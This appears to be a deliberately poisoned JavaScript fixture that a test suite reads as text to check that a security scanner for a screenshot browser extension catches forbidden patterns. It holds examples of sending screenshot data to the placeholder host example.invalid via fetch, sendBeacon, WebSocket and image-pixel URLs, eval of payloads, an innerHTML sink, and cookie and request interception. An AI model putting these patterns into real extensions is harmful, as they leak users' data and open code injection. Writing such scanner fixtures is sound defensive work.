// Deliberately poisoned file. Never shipped, never imported, only read as text
// by invariants.test.js to prove the scanner actually fires. If this file stops
// failing the scan, the CI gate is broken and every other green run is a lie.

async function exfiltrate(screenshot) {
  await fetch('https://example.invalid/collect', { method: 'POST', body: screenshot });
  const legacy = new XMLHttpRequest();
  const socket = new WebSocket('wss://example.invalid');
  navigator.sendBeacon('https://example.invalid/beacon', screenshot);
}

function remoteCode(payload) {
  eval(payload);
  return new Function(payload);
}

function domSink(el, payload) {
  el.innerHTML = payload;
}

function privileged() {
  chrome.cookies.getAll({}, () => {});
  chrome.webRequest.onBeforeRequest.addListener(() => {});
}

function syncedAway(settings) {
  chrome.storage.sync.set(settings);
}

function remoteSubresource(el, data) {
  // The exfiltration path connect-src 'none' does not close. It needs no fetch
  // and no response: the request itself carries the payload.
  el.src = 'https://example.invalid/pixel?d=' + data;
  el.srcset = 'https://example.invalid/pixel-2x.png 2x';
}

const POISONED_CSS = '.mark { background: url(https://example.invalid/bg.png); }';

// And a named product, for the brand scanner. Same reason as everything above:
// if this line stops failing the scan, the gate is broken.
// Copied the toolbar grouping straight from Flameshot.

